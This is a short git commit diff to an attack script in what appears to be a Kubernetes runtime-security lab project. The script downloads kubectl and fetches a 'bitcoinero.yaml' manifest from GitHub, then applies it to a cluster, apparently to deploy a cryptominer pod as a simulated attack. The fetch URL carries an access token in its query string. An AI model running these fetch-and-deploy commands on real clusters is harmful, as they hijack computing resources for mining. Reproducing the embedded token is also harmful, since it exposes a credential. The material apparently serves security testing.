d314a438fba51d449fcbac953b8814c13f83eea1
Rahman <abdurrahman1270@gmail.com>
2023-03-22 14:15:31 +0700

    revise attack script and change name for services

--- attacking-scripts/attack.sh
+++ attacking-scripts/attack.sh
@@ -1,4 +1,6 @@
-cd /tmp
+export PATH=/tmp:$PATH
+cd /tmp; curl -LO https://dl.k8s.io/release/v1.22.0/bin/linux/amd64/kubectl; chmod 555 kubectl
+curl -LO https://raw.githubusercontent.com/Abdurrahmanm4nn/runtime-security-kubernetes/main/attacking-scripts/bitcoinero.yaml?token=GHSAT0AAAAAAB77XEROLB6X42WUQMXU6CXCZA2WUTA
 ./kubectl apply -f bitcoinero.yaml
 sleep 5
 ./kubectl get pods
